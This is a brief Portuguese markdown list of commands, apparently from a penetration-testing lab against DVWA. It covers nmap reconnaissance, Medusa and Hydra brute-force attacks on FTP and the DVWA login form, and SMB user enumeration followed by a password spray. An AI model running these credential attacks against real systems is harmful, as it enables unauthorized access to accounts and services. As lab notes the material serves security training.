# Comandos utilizados

## Reconhecimento

- `nmap -sn TARGET_IP_RANGE`
- `nmap -sV TARGET_IP`

## Descobrindo usuário e senha do serviço FTP

- `medusa -h TARGET_IP -U users.txt -P pass.txt -M ftp -t 6`
  
## Descobrindo usuário e senha do DVWA

- `hydra -L users.txt -P pass.txt TARGET_IP http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -T 6`

## Enumerando usuários e realizando password_spray contra o SMB

- `enum4linux -a TARGET_IP`
- `medusa -h TARGET_IP -U smb_users.txt -P passwords_spray.txt -M smbnt -t 6`
